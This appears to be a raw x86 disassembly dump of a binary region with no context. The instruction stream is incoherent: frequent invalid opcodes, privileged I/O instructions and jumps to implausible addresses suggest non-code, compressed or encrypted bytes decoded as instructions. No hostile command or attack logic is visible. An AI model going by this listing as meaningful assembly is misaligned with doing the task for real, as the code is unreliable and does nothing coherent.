  43c2ca:	or     eax,0xe12358e9
  43c2cf:	jmp    0xe7b09c35
  43c2d4:	xor    esi,ecx
  43c2d6:	adc    eax,0x85e22a93
  43c2db:	sbb    al,0xfe
  43c2dd:	pop    DWORD PTR [ebp-0x70edffe4]
  43c2e3:	test   DWORD PTR [edx+ebp*4],esp
  43c2e6:	nop
  43c2e7:	call   0xf8256811
  43c2ec:	push   0xd
  43c2ee:	aad    0x7d
  43c2f0:	sub    DWORD PTR ds:0x48a156d4,edx
  43c2f6:	loope  0x43c2ef
  43c2f8:	push   esi
  43c2f9:	mov    dl,BYTE PTR [esi-0x22]
  43c2fc:	lods   al,BYTE PTR ds:[esi]
  43c2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c2fe:	int3   
  43c2ff:	add    BYTE PTR [edx-0x16fef6f7],bl
  43c305:	popa   
  43c306:	ja     0x43c309
  43c308:	sahf   
  43c309:	stos   BYTE PTR es:[edi],al
  43c30a:	retf   
  43c30b:	and    BYTE PTR [ebp+0x418bd94d],bh
  43c311:	ficomp WORD PTR [eax*1+0x436ccae2]
  43c318:	and    DWORD PTR [ecx-0x67],0xe00fe900
  43c31f:	dec    esi
  43c320:	add    BYTE PTR [edi+ebp*8+0x17],bl
  43c324:	ins    BYTE PTR es:[edi],dx
  43c325:	pop    es
  43c326:	fdivr  QWORD PTR [ebp+0x4d]
  43c329:	push   edi
  43c32a:	fs push edx
  43c32c:	clc    
  43c32d:	ret    0x509d
  43c330:	mov    ecx,DWORD PTR [esi+0x77537eed]
  43c336:	fs push edx
  43c338:	adc    al,0xc8
  43c33a:	sbb    DWORD PTR [ecx+ecx*4],ecx
  43c33d:	cmp    BYTE PTR [ebp+0x3c],bl
  43c340:	pop    eax
  43c341:	mov    dl,0x94
  43c343:	pusha  
  43c344:	mov    DWORD PTR [eax],eax
  43c346:	mov    al,ds:0xc3937f79
  43c34b:	aam    0x0
  43c34d:	add    BYTE PTR [eax],dl
  43c34f:	pop    ds
  43c350:	jae    0x43c36b
  43c352:	dec    eax
  43c353:	mov    al,0xf9
  43c355:	adc    eax,0x3c8827
  43c35a:	mov    BYTE PTR [ecx],bl
  43c35c:	add    BYTE PTR [ebx+0x3d],bl
  43c35f:	dec    ebp
  43c360:	nop
  43c361:	(bad)  
  43c362:	fcom   QWORD PTR [edi]
  43c364:	pop    ecx
  43c365:	mov    esp,esi
  43c367:	mov    cl,0xb6
  43c369:	adc    al,0xcb
  43c36b:	bound  eax,QWORD PTR [edx+0xc]
  43c36e:	inc    edx
  43c36f:	xchg   esp,eax
  43c370:	dec    eax
  43c371:	cmp    esi,DWORD PTR [ecx+ecx*4+0x8]
  43c375:	mov    ecx,DWORD PTR [ebp+0x61]
  43c378:	idiv   edi
  43c37a:	retf   
  43c37b:	pop    esp
  43c37c:	dec    DWORD PTR [edx-0x30d31432]
  43c382:	out    0xcf,eax
  43c384:	rol    DWORD PTR [ecx],0x85
  43c387:	fild   DWORD PTR [eax]
  43c389:	add    BYTE PTR [eax],al
  43c38b:	pop    edi
  43c38c:	jg     0x43c38e
  43c38e:	jnp    0x43c36b
  43c390:	jne    0x43c372
  43c392:	jne    0x43c3ee
  43c394:	loopne 0x43c398
  43c396:	xlat   BYTE PTR ds:[ebx]
  43c397:	icebp  
  43c398:	je     0x43c382
  43c39a:	(bad)  
  43c39b:	hlt    
  43c39c:	inc    edi
  43c39d:	or     esp,ecx
  43c39f:	fld    DWORD PTR [edx]
  43c3a1:	jae    0x43c3ef
  43c3a3:	scas   eax,DWORD PTR es:[edi]
  43c3a4:	std    
  43c3a5:	(bad)  
  43c3a6:	pop    ebp
  43c3a7:	icebp  
  43c3a8:	add    esp,ebp
  43c3aa:	add    BYTE PTR [edi+ebp*4-0x3],ah
  43c3ae:	std    
  43c3af:	dec    ebp
  43c3b0:	icebp  
  43c3b1:	add    esp,ebp
  43c3b3:	pop    esp
  43c3b4:	das    
  43c3b5:	std    
  43c3b6:	push   es
  43c3b7:	(bad)  
  43c3b8:	lock add eax,DWORD PTR [ebp+0x35cdc]
  43c3bf:	bound  edi,QWORD PTR [ecx+0x4a]
  43c3c2:	jo     0x43c39f
  43c3c4:	fwait
  43c3c5:	push   esp
  43c3c6:	xchg   DWORD PTR [ecx-0x71c38a74],ebx
  43c3cc:	jnp    0x43c43b
  43c3ce:	mov    esp,DWORD PTR [edx-0x10]
  43c3d1:	add    eax,DWORD PTR [edi+0x378d9]
  43c3d7:	bound  ebp,QWORD PTR [ebx+0x35]
  43c3da:	xor    bl,ch
  43c3dc:	jae    0x43c365
  43c3de:	(bad)  
  43c3df:	in     eax,dx
  43c3e0:	lock jp 0x43c3a4
  43c3e3:	xlat   BYTE PTR ds:[ebx]
  43c3e4:	fwait
  43c3e5:	jnp    0x43c3e6
  43c3e7:	(bad)  
  43c3e9:	test   BYTE PTR [edx+eiz*2],al
  43c3ec:	lock add ebp,ebp
  43c3ef:	pop    es
  43c3f0:	jl     0x43c42d
  43c3f2:	dec    eax
  43c3f3:	fld    TBYTE PTR [ebx-0x3d]
  43c3f6:	(bad)  
  43c3f7:	mov    ebp,0x26477af0
  43c3fc:	ret    
  43c3fd:	mov    edi,0x3b4d986
  43c402:	add    BYTE PTR [edx+0x69],ah
  43c405:	dec    edx
  43c406:	sbb    cl,ch
  43c408:	push   0xf095ff6f
  43c40d:	xor    dh,0x0
  43c410:	pop    esi
  43c411:	and    eax,0xd9ad354e
  43c416:	xchg   esp,eax
  43c417:	pop    ecx
  43c418:	mov    ds:0x6203325a,eax
  43c41d:	fld1   
  43c41f:	add    esp,DWORD PTR [edx-0x27]
  43c422:	bound  edi,QWORD PTR [ebx-0x33]
  43c425:	fldl2t 
  43c427:	add    esp,ebp
  43c429:	xchg   ecx,eax
  43c42a:	cmp    DWORD PTR [edx-0x1b],0x6203ea3c
  43c431:	push   eax
  43c432:	fwait
  43c433:	inc    edi
  43c434:	fist   WORD PTR [eax-0x76]
  43c437:	add    al,0x62
  43c439:	fnstenv [eax+0x79]
  43c43c:	mov    ch,0xd9
  43c43e:	jmp    0x7e8cab46
  43c443:	add    al,0x62
  43c445:	fnstenv [edx+0x37]
  43c448:	push   ds
  43c449:	push   eax
  43c44a:	pop    ebx
  43c44b:	adc    BYTE PTR ds:0x1c10e9de,0xda
  43c452:	popa   
  43c453:	lods   al,BYTE PTR ds:[esi]
  43c454:	add    eax,0xedf0e9de
  43c459:	cld    
  43c45a:	jmp    0xa99e2662
  43c45f:	out    0x5e,al
  43c461:	push   es
  43c462:	popa   
  43c463:	dec    ecx
  43c464:	pop    edx
  43c465:	push   eax
  43c466:	xor    eax,DWORD PTR [ebp+eiz*8-0x77]
  43c46a:	sbb    eax,0xe9f8ed7b
  43c46f:	add    esp,DWORD PTR [edx-0x7e]
  43c472:	pusha  
  43c473:	mov    WORD PTR [eax],es
  43c475:	rcr    eax,0xe9
  43c478:	add    ebx,DWORD PTR [eax]
  43c47a:	stos   BYTE PTR es:[edi],al
  43c47b:	sub    DWORD PTR ds:0xc1acf3df,esp
  43c481:	push   ecx
  43c482:	fldcw  WORD PTR [edx-0x35]
  43c485:	pop    ebp
  43c486:	bound  ecx,QWORD PTR fs:[ecx]
  43c489:	mov    bl,0x63
  43c48b:	dec    esi
  43c48c:	jns    0x43c4fe
  43c48e:	mov    ecx,0xd94dc500
  43c493:	push   0xfffffff1
  43c495:	or     BYTE PTR [ebp+0x6d42481c],cl
  43c49b:	cmp    al,0xe9
  43c49d:	sbb    edi,ebx
  43c49f:	xchg   edi,eax
  43c4a0:	test   eax,0xc1445661
  43c4a5:	in     al,dx
  43c4a6:	pushf  
  43c4a7:	cld    
  43c4a8:	xchg   edx,eax
  43c4a9:	xor    BYTE PTR [ebp+0x546d8289],cl
  43c4af:	cmp    DWORD PTR [eax-0x65],esp
  43c4b2:	shr    eax,1
  43c4b4:	loope  0x43c436
  43c4b6:	fld    DWORD PTR [eax]
  43c4b8:	jb     0x43c4cb
  43c4ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c4bb:	out    dx,eax
  43c4bc:	push   esp
  43c4bd:	das    
  43c4be:	push   esi
  43c4bf:	ds loope 0x43c4b0
  43c4c2:	popf   
  43c4c3:	dec    eax
  43c4c4:	loope  0x43c527
  43c4c6:	fld    DWORD PTR [eax]
  43c4c8:	ror    BYTE PTR [esi-0x1e],1
  43c4cb:	idiv   DWORD PTR [esi-0x230875ae]
  43c4d1:	ins    DWORD PTR es:[edi],dx
  43c4d2:	ins    DWORD PTR es:[edi],dx
  43c4d3:	cmp    al,0xe9
  43c4d5:	loop   0x43c4ef
  43c4d7:	or     DWORD PTR [edx+0x0],eax
  43c4da:	jnp    0x43c4f6
  43c4dc:	push   edi
  43c4dd:	ds jnp 0x43c4d7
  43c4e0:	push   ebp
  43c4e1:	stos   DWORD PTR es:[edi],eax
  43c4e2:	std    
  43c4e3:	fmul   st(3),st
  43c4e5:	popf   
  43c4e6:	lods   eax,DWORD PTR ds:[esi]
  43c4e7:	adc    ch,al
  43c4e9:	mov    ch,0x15
  43c4eb:	adc    ebp,eax
  43c4ed:	lods   eax,DWORD PTR ds:[esi]
  43c4ee:	or     eax,0x4b1cc511
  43c4f3:	lock mov esp,DWORD PTR [edx+ecx*8]
  43c4f7:	push   ebp
  43c4f8:	inc    esi
  43c4f9:	icebp  
  43c4fa:	jno    0x43c56f
  43c4fc:	add    bl,dl
  43c4fe:	popa   
  43c4ff:	jae    0x43c501
  43c501:	mov    eax,0x4ef64689
  43c506:	sahf   
  43c507:	jg     0x43c4cb
  43c509:	add    BYTE PTR [ebx+0x47ccc4d8],dl
  43c50f:	and    al,0xcc
  43c511:	int3   
  43c512:	out    dx,al
  43c513:	popa   
  43c514:	jmp    0x43c569
  43c516:	in     al,dx
  43c517:	popa   
  43c518:	jp     0x43c522
  43c51a:	dec    esp
  43c51b:	fadd   DWORD PTR [eax]
  43c51d:	add    BYTE PTR [ebx+0x3cda7dd8],cl
  43c523:	(bad)  
  43c525:	(bad)  
  43c526:	jnp    0x43c500
  43c528:	and    bl,0x48
  43c52b:	mov    ch,0xc1
  43c52d:	push   es
  43c52e:	dec    ebx
  43c52f:	fadd   DWORD PTR [eax]
  43c531:	add    BYTE PTR [ebx+0x3ac6f711],bh
  43c537:	fadd   DWORD PTR [eax]
  43c539:	add    BYTE PTR [ebx+0x7b],cl
  43c53c:	jae    0x43c552
  43c53e:	add    ah,bh
  43c540:	aad    0x0
  43c542:	add    BYTE PTR [ebx],bh
  43c544:	pop    eax
  43c545:	rol    DWORD PTR [eax],0x38
  43c548:	fadd   DWORD PTR [eax]
  43c54a:	add    ah,cl
  43c54c:	into   
  43c54d:	idiv   edi
  43c54f:	or     ebx,eax
  43c551:	pop    ebx
  43c552:	ret    
  43c553:	int    0x12
  43c555:	add    al,0x74
  43c557:	and    eax,0xbfff70f
  43c55c:	fadd   st,st(0)
  43c55e:	(bad)  
  43c55f:	or     edx,ebx
  43c561:	add    BYTE PTR [eax],al
  43c563:	sti    
  43c564:	js     0x43c51b
  43c566:	idiv   BYTE PTR [ecx+0xc0c6ccc]
  43c56c:	(bad)  
  43c56d:	add    BYTE PTR [eax],al
  43c56f:	retf   
  43c570:	pop    ss
  43c571:	rol    DWORD PTR [eax],0xb9
  43c574:	xlat   BYTE PTR ds:[ebx]
  43c575:	add    BYTE PTR [eax],al
  43c577:	push   esi
  43c578:	adc    al,0xcc
  43c57a:	int3   
  43c57b:	ja     0x43c586
  43c57d:	int3   
  43c57e:	int3   
  43c57f:	xchg   DWORD PTR [ecx],ecx
  43c581:	int3   
  43c582:	int3   
  43c583:	bound  edi,QWORD PTR [edi+0x5a582bc]
  43c589:	hlt    
  43c58a:	jl     0x43c529
  43c58c:	xchg   edx,eax
  43c58d:	cmp    BYTE PTR ds:0x8264431,ah
  43c593:	push   ecx
  43c594:	(bad)  
  43c595:	push   DWORD PTR es:[eax]
  43c598:	stos   DWORD PTR es:[edi],eax
  43c599:	sbb    DWORD PTR [eax],esp
  43c59b:	push   cs
  43c59c:	cs add al,0x85
  43c59f:	jb     0x43c60f
  43c5a1:	enter  0xb,0xe7
  43c5a5:	mov    ebx,0xcb0d0c39
  43c5aa:	sbb    DWORD PTR [eax-0x7afbcf90],ebx
  43c5b0:	sbb    al,0x3b
  43c5b2:	push   edi
  43c5b3:	mov    ebp,0x870042db
  43c5b8:	test   BYTE PTR [edx+0x57],cl
  43c5bb:	mov    ebp,0xcbc8252e
  43c5c0:	es sub eax,0x9e1ecbc8
  43c5c6:	xchg   ebx,ebp
  43c5c8:	fldenv [ebp+0x10e7d0c]
  43c5ce:	pop    edx
  43c5cf:	push   ecx
  43c5d0:	out    0xb5,eax
  43c5d2:	mov    ah,0x4f
  43c5d4:	fistp  WORD PTR [ebp+0x249f8aac]
  43c5da:	xchg   ecx,eax
  43c5db:	dec    edx
  43c5dc:	(bad)  
  43c5dd:	inc    edx
  43c5df:	out    0x33,eax
  43c5e1:	cmp    eax,ebx
  43c5e3:	clc    
  43c5e4:	fnstenv [ebp-0xae182f0]
  43c5ea:	mov    dh,al
  43c5ec:	push   esi
  43c5ed:	xrelease xchg BYTE PTR [edx-0x2a],al
  43c5f1:	jne    0x43c5b6
  43c5f3:	jae    0x43c65f
  43c5f5:	ja     0x43c64f
  43c5f7:	clc    
  43c5f8:	sub    eax,0xb65287be
  43c5fd:	fnstcw WORD PTR [ebx-0x5116ef72]
  43c603:	push   ebp
  43c604:	adc    cl,BYTE PTR [eax-0x41ffe7b2]
  43c60a:	(bad)  
  43c60b:	test   eax,0x51e1e703
  43c610:	fidiv  DWORD PTR ss:[esi]
  43c614:	bound  ebp,QWORD PTR [eax]
  43c616:	dec    esi
  43c617:	inc    ebp
  43c618:	pusha  
  43c619:	(bad)  
  43c61a:	or     eax,0xda9cf16
  43c61f:	cs iret 
  43c621:	test   eax,0x99cf260d
  43c626:	or     eax,0x88798eb5
  43c62b:	scas   eax,DWORD PTR es:[edi]
  43c62c:	mov    ss,eax
  43c62e:	int    0xba
  43c630:	ret    
  43c631:	fcom   QWORD PTR [ebx+0x655387f5]
  43c637:	mov    eax,0x21545b8e
  43c63c:	aaa    
  43c63d:	xchg   DWORD PTR [esi+0x35],ecx
  43c640:	sbb    BYTE PTR [edx-0x623fe2b4],dl
  43c646:	dec    esi
  43c647:	and    eax,0x38899414
  43c64c:	shl    DWORD PTR [eax-0x7],0xdb
  43c650:	inc    ebx
  43c651:	bound  edx,QWORD PTR [edx+ebp*4+0x37]
  43c655:	jb     0x43c631
  43c657:	aam    0x47
  43c659:	push   esp
  43c65a:	cdq    
  43c65b:	jmp    0x14f6bbe4
  43c660:	push   es
  43c661:	inc    edi
  43c662:	sbb    DWORD PTR [ecx+0x4a],esi
  43c665:	dec    si
  43c667:	and    eax,0x7d4e8bc0
  43c66c:	pop    edi
  43c66d:	add    BYTE PTR [edi],bl
  43c66f:	or     eax,0xca9d0ae
  43c674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c675:	rcr    BYTE PTR [ecx-0x28e3fef4],1
  43c67b:	in     eax,dx
  43c67c:	push   ecx
  43c67d:	pop    ss
  43c67e:	out    dx,eax
  43c67f:	data16 add al,0x1a
  43c682:	sahf   
  43c683:	push   edx
  43c684:	ds pop ebp
  43c686:	in     eax,0xe7
  43c688:	ins    BYTE PTR es:[edi],dx
  43c689:	sbb    bh,dl
  43c68b:	iret   
  43c68c:	jge    0x43c6ae
  43c68e:	pop    edx
  43c68f:	mov    ah,0x8b
  43c691:	pushf  
  43c692:	ins    DWORD PTR es:[edi],dx
  43c693:	mov    DWORD PTR [ebp-0x7476325c],eax
  43c699:	lods   al,BYTE PTR ds:[esi]
  43c69a:	jno    0x43c627
  43c69c:	push   eax
  43c69d:	cwde   
  43c69e:	mov    ds:0x21fbd8c6,al
  43c6a3:	fnstcw WORD PTR [ebp+0x29]
  43c6a6:	xor    eax,0x1dfcf7c9
  43c6ab:	retf   
  43c6ac:	inc    eax
  43c6ad:	jmp    0x7c629798
  43c6b2:	pop    edi
  43c6b3:	push   es
  43c6b4:	shl    DWORD PTR [eax-0x68],0xdd
  43c6b8:	mov    ebp,DWORD PTR [ebp+eax*1-0x62fb73cd]
  43c6bf:	xchg   esi,eax
  43c6c0:	les    esi,FWORD PTR [ebp-0x523b5adb]
  43c6c6:	sbb    eax,0xd73cc4a5
  43c6cb:	les    eax,FWORD PTR [ebx-0x73d49643]
  43c6d1:	cmp    al,0x0
  43c6d3:	jb     0x43c6ff
  43c6d5:	xor    al,0xbe
  43c6d7:	out    0xa0,al
  43c6d9:	imul   DWORD PTR [edx+0x17]
  43c6dc:	sar    BYTE PTR [ebx],cl
  43c6de:	mov    dh,0x35
  43c6e0:	sbb    al,0x8c
  43c6e2:	div    esi
  43c6e4:	mov    eax,ds:0xd83fde6c
  43c6e9:	test   BYTE PTR [edx+eiz*1],ch
  43c6ec:	sub    DWORD PTR [eax+0x38],edx
  43c6ef:	jmp    0x5244c047
  43c6f4:	pop    ss
  43c6f5:	cmc    
  43c6f6:	push   DWORD PTR [esi-0x44bffa98]
  43c6fc:	arpl   WORD PTR [edx-0x8],ax
  43c6ff:	dec    eax
  43c700:	xchg   esp,eax
  43c701:	clc    
  43c702:	jne    0x43c76f
  43c704:	data16 cmp al,BYTE PTR [ecx+ebp*4+0x1c]
  43c709:	add    edi,edi
  43c70b:	fs pop edi
  43c70d:	mov    bh,0x74
  43c70f:	call   0x59e0:0xc589d099
  43c716:	adc    DWORD PTR [ebx-0x67],0x74
  43c71a:	retf   0x3a4c
  43c71d:	jle    0x43c704
  43c71f:	out    dx,al
  43c720:	popf   
  43c721:	jl     0x43c768
  43c723:	inc    ebx
  43c724:	gs push edx
  43c726:	cld    
  43c727:	lods   al,BYTE PTR ds:[esi]
  43c728:	cmp    bh,BYTE PTR [esi-0x1b]
  43c72b:	scas   al,BYTE PTR es:[edi]
  43c72c:	popf   
  43c72d:	retf   
  43c72e:	int3   
  43c72f:	jg     0x43c6d9
  43c731:	retf   
  43c732:	int3   
  43c733:	vpcomb xmm0,xmm6,XMMWORD PTR [eax],0x7f
  43c739:	test   al,0xcb
  43c73b:	int3   
  43c73c:	out    0x64,al
  43c73e:	jmp    0x43c796
  43c740:	ror    BYTE PTR [edi],0x5
  43c743:	xor    edi,ecx
  43c745:	pop    ebx
  43c746:	mov    edi,0x738fc6ff
  43c74b:	add    al,al
  43c74d:	out    dx,eax
  43c74e:	jge    0x43c79d
  43c750:	adc    ebx,DWORD PTR [ebx-0x22]
  43c753:	add    BYTE PTR [edi-0xf],dl
  43c756:	aas    
  43c757:	je     0x43c76a
  43c759:	and    eax,0xdb923274
  43c75e:	add    BYTE PTR [eax],al
  43c760:	or     eax,DWORD PTR [ebx-0x23f54702]
  43c766:	add    BYTE PTR [eax],al
  43c768:	rcr    dl,1
  43c76a:	and    eax,0xd34562c9
  43c76f:	jae    0x43c6f5
  43c771:	adc    DWORD PTR [edx+ecx*2+0x144a4d72],ecx
  43c778:	xor    dh,cl
  43c77a:	push   edx
  43c77b:	stc    
  43c77c:	outs   dx,DWORD PTR ds:[esi]
  43c77d:	adc    eax,DWORD PTR ds:[eax+0x62]
  43c781:	inc    ebx
  43c782:	mov    ch,0xf8
  43c784:	das    
  43c785:	iret   
  43c786:	mov    dh,0x12
  43c788:	es aam 0x43
  43c78b:	add    bl,bl
  43c78d:	xchg   edi,edi
  43c78f:	jl     0x43c73b
  43c791:	es push edi
  43c793:	pop    ebx
  43c794:	mov    eax,ds:0x2f59c3d2
  43c799:	add    edx,ecx
  43c79b:	retf   
  43c79c:	add    BYTE PTR [esi+0x14eb8a74],dl
  43c7a2:	outs   dx,DWORD PTR ds:[esi]
  43c7a3:	mov    bh,BYTE PTR [edx+0x66]
  43c7a6:	inc    ebx
  43c7a7:	xbegin 0x157cbe94
  43c7ad:	fld    st(6)
  43c7af:	mov    BYTE PTR [edi-0x6ac462a],bh
  43c7b5:	outs   dx,DWORD PTR ds:[esi]
  43c7b6:	cmp    BYTE PTR [ebx],dl
  43c7b8:	inc    eax
  43c7b9:	bound  edx,QWORD PTR [ebx-0x3f47af53]
  43c7bf:	mov    dh,0x12
  43c7c1:	xchg   BYTE PTR [eax+eax*2+0x0],dl
  43c7c5:	loope  0x43c74b
  43c7c7:	or     ebx,DWORD PTR [ecx-0x27]
  43c7ca:	jle    0x43c821
  43c7cc:	pop    ebx
  43c7cd:	and    DWORD PTR [esi],edx
  43c7cf:	mov    ebx,gs
  43c7d1:	jmp    0x2ac0d8cb
  43c7d6:	mov    al,ds:0xc396c688
  43c7db:	mov    bh,BYTE PTR [esi]
  43c7dd:	pop    esi
  43c7de:	in     eax,dx
  43c7df:	ret    
  43c7e0:	retf   
  43c7e1:	cs jne 0x43c7ab
  43c7e4:	retf   
  43c7e5:	fisubr DWORD PTR es:[ebp-0x5a59e631]
  43c7ec:	iret   
  43c7ed:	sbb    DWORD PTR [esi+0x62c98b34],esp
  43c7f3:	sbb    al,0xc
  43c7f5:	mov    ds:0x8e6b49d9,eax
  43c7fa:	fstp   DWORD PTR [esi+0x40d95e43]
  43c800:	inc    edx
  43c801:	add    BYTE PTR [edx-0x62],ah
  43c804:	sub    DWORD PTR [edx+edx*1],ecx
  43c807:	sub    BYTE PTR [edx-0x19e65cfd],0x63
  43c80e:	cld    
  43c80f:	sbb    ch,dl
  43c811:	(bad)  
  43c812:	pop    ebp
  43c813:	jmp    0xd99a3211
  43c818:	es inc ebx
  43c81a:	jbe    0x43c865
  43c81c:	xchg   esp,eax
  43c81d:	inc    edx
  43c81e:	bound  ebx,QWORD PTR [esi-0x7c3de457]
  43c824:	stos   BYTE PTR es:[edi],al
  43c825:	add    esp,DWORD PTR [ebx+0x6203fe19]
  43c82b:	fldl2t 
  43c82d:	pusha  
  43c82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c82f:	fucomp st(1)
  43c831:	iret   
  43c832:	sub    DWORD PTR [ebp-0x5ad630eb],esp
  43c838:	sub    eax,0x25a519cf
  43c83d:	iret   
  43c83e:	sbb    DWORD PTR [ebp+0x2a498a94],esp
  43c844:	nop
  43c845:	push   esi
  43c846:	fist   WORD PTR [ebx-0xe]
  43c849:	lock push ss
  43c84b:	adc    ah,bl
  43c84d:	cmp    BYTE PTR [esi+0x57205662],ch
  43c853:	retf   0x2f4d
  43c856:	dec    ebp
  43c857:	or     bh,BYTE PTR ss:[eax]
  43c85a:	jp     0x43c86c
  43c85c:	pop    ss
  43c85d:	call   0x604502f3
  43c862:	lahf   
  43c863:	in     eax,dx
  43c864:	mov    DWORD PTR [esi],ecx
  43c866:	add    BYTE PTR [esi+0x5e],ah
  43c869:	push   edi
  43c86a:	add    DWORD PTR [edi],esp
  43c86c:	sbb    DWORD PTR ds:0xd961eb,esp
  43c872:	bound  esp,QWORD PTR [ecx+eiz*8]
  43c875:	mov    DWORD PTR [edi],esp
  43c877:	outs   dx,BYTE PTR ds:[esi]
  43c878:	pop    esp
  43c879:	ds loope 0x43c854
  43c87c:	das    
  43c87d:	or     eax,0xfe52a2c2
  43c882:	jge    0x43c822
  43c884:	pop    esi
  43c885:	ds shr edx,1
  43c888:	pop    ss
  43c889:	sbb    DWORD PTR [edx-0x62],esi
  43c88c:	enter  0x2d9,0x99
  43c890:	push   esp
  43c891:	loop   0x43c823
  43c893:	xor    edx,DWORD PTR [edx+eax*8-0x28]
  43c897:	xor    bl,BYTE PTR [esi+0x46]
  43c89a:	in     eax,dx
  43c89b:	xor    dl,BYTE PTR [ecx+edi*8-0x15]
  43c89f:	dec    esp
  43c8a0:	fsubr  st,st(0)
  43c8a2:	xchg   ebp,eax
  43c8a3:	jbe    0x43c87a
  43c8a5:	test   DWORD PTR [edx+0x5d],0x61b99dc1
  43c8ac:	(bad)  [ecx-0x75d88e5a]
  43c8b2:	mov    bh,0x49
  43c8b4:	mov    ebp,0xd961a049
  43c8b9:	sub    DWORD PTR ds:0xba57325a,0x21
  43c8c0:	cs push esi
  43c8c2:	sub    ebp,DWORD PTR [edx-0x27]
  43c8c5:	push   edi
  43c8c6:	(bad)  
  43c8c7:	mov    ecx,0xe6f7d2
  43c8cc:	out    dx,al
  43c8cd:	sub    eax,0xd95dab56
  43c8d2:	les    edi,FWORD PTR [edi]
  43c8d4:	jmp    0x43c91a
  43c8d6:	or     DWORD PTR [esi],esi
  43c8d8:	jmp    0x43c926
  43c8da:	or     eax,0xb6a79000
  43c8df:	jmp    0x1080:0x3e136113
  43c8e6:	or     DWORD PTR [esi+0xd90a],edi
  43c8ec:	cli    
  43c8ed:	or     BYTE PTR ds:0x88f12b8b,cl
  43c8f3:	or     al,0xb1
  43c8f5:	xlat   BYTE PTR ds:[ebx]
  43c8f6:	jo     0x43c90c
  43c8f8:	test   BYTE PTR [ebx],dh
  43c8fa:	mov    dh,0xcc
  43c8fc:	pop    ss
  43c8fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c8fe:	retf   
  43c8ff:	int3   
  43c900:	mul    DWORD PTR [ebx+ecx*8+0x586258cc]
  43c907:	sbb    al,0x4d
  43c909:	sub    ch,cl
  43c90b:	xor    eax,0x8b00d8f6
  43c910:	mov    ah,ch
  43c912:	jge    0x43c95b
  43c914:	fwait
  43c915:	pop    ecx
  43c916:	ret    
  43c917:	add    al,0x70
  43c919:	lea    esi,[ecx+0x2]
  43c91c:	adc    BYTE PTR [eax-0x3f30097e],cl
  43c922:	jl     0x43c967
  43c924:	fwait
  43c925:	popa   
  43c926:	dec    eax
  43c927:	or     al,0xcd
  43c929:	sub    BYTE PTR [eax-0x18],cl
  43c92c:	out    dx,eax
  43c92d:	sub    DWORD PTR [ecx],eax
  43c92f:	add    BYTE PTR [eax],al
  43c931:	jp     0x43c940
  43c933:	add    eax,0xf7e7f801
  43c938:	jbe    0x43c989
  43c93a:	mov    edi,0x9cb81070
  43c93f:	or     ebp,DWORD PTR [ecx]
  43c941:	enter  0x73ec,0x6
  43c945:	shr    BYTE PTR [ecx],0x9
  43c948:	mov    eax,ebx
  43c94a:	out    0x5a,eax
  43c94c:	pop    ebx
  43c94d:	clc    
  43c94e:	mov    al,ds:0xa0f7cccb
  43c953:	retf   
  43c954:	int3   
  43c955:	bound  edx,QWORD PTR ds:0x37aceb88
  43c95b:	xor    cl,BYTE PTR [eax]
  43c95d:	out    0x93,eax
  43c95f:	or     eax,DWORD PTR [eax+eiz*1-0x16fffc3e]
  43c966:	add    ebx,DWORD PTR [ecx]
  43c968:	and    DWORD PTR [edx],0xffffffb3
  43c96b:	ja     0x43c91d
  43c96d:	(bad)  
  43c96f:	add    edx,DWORD PTR [ecx-0x27]
  43c972:	stc    
  43c973:	add    BYTE PTR [ebp-0x23],bh
  43c976:	xchg   edi,eax
  43c977:	daa    
  43c978:	sub    al,0xe1
  43c97a:	bound  eax,QWORD PTR [ecx+0x74]
  43c97d:	test   DWORD PTR [edi],edi
  43c97f:	mov    esp,0x7ea04e46
  43c984:	clc    
  43c985:	sbb    esi,edx
  43c987:	sbb    BYTE PTR [ebp-0x4b],bh
  43c98a:	fidiv  DWORD PTR [eax]
  43c98c:	sbb    cl,ah
  43c98e:	cmp    ch,BYTE PTR [esi]
  43c990:	je     0x43c9e3
  43c992:	inc    ecx
  43c993:	mov    esp,0xc2600095
  43c998:	add    esi,DWORD PTR [ecx+ebp*2-0x7d]
  43c99c:	jnp    0x43c997
  43c99e:	lea    ebx,[edx]
  43c9a0:	mov    esp,0x1002759
  43c9a5:	add    cl,ch
  43c9a7:	or     DWORD PTR [ebx],0x88da283
  43c9ad:	test   DWORD PTR [esi+eiz*4],ebx
  43c9b0:	push   ebx
  43c9b1:	test   DWORD PTR [edx+ebp*4],ebx
  43c9b4:	push   ebx
  43c9b5:	stc    
  43c9b6:	xor    eax,DWORD PTR [eax-0x3f]
  43c9b9:	pop    es
  43c9ba:	jmp    0xa0c8d949
  43c9bf:	test   BYTE PTR [eax-0x793a3141],al
  43c9c5:	dec    ecx
  43c9c6:	xchg   BYTE PTR [eax-0x7a],dh
  43c9c9:	inc    ecx
  43c9ca:	mov    dh,BYTE PTR [eax-0x46]
  43c9cd:	into   
  43c9ce:	loope  0x43c9a9
  43c9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c9d1:	or     ebx,edi
  43c9d3:	sub    esi,esi
  43c9d5:	mov    ds,WORD PTR [edi+0x19]
  43c9d8:	gs ret 
  43c9da:	xchg   ecx,eax
  43c9db:	in     al,0x62
  43c9dd:	dec    ecx
  43c9de:	inc    esi
  43c9df:	sub    DWORD PTR [ebx+0x41],esi
  43c9e2:	cmp    ch,BYTE PTR [ecx]
  43c9e4:	mov    bh,0xd4
  43c9e6:	jle    0x43c985
  43c9e8:	loope  0x43c978
  43c9ea:	xchg   ebx,eax
  43c9eb:	cmc    
  43c9ec:	bound  eax,QWORD PTR [ebp+0x2a]
  43c9ef:	pop    esp
  43c9f0:	test   eax,0x275e592f
  43c9f5:	loopne 0x43ca24
  43c9f7:	pop    esi
  43c9f8:	daa    
  43c9f9:	in     al,dx
  43c9fa:	add    BYTE PTR ds:0xa186b8d2,ah
  43ca00:	loope  0x43ca74
  43ca02:	push   ecx
  43ca03:	pop    si
  43ca05:	pop    ds
  43ca06:	in     al,dx
  43ca07:	out    0x23,al
  43ca09:	(bad)  
  43ca0a:	push   ebp
  43ca0b:	adc    dl,dl
  43ca0d:	cwde   
  43ca0e:	xchg   BYTE PTR [ecx+0x26c41ae1],ah
  43ca14:	rcr    al,cl
  43ca16:	or     dh,cl
  43ca18:	cdq    
  43ca19:	scas   al,BYTE PTR es:[edi]
  43ca1a:	ret    0xf523
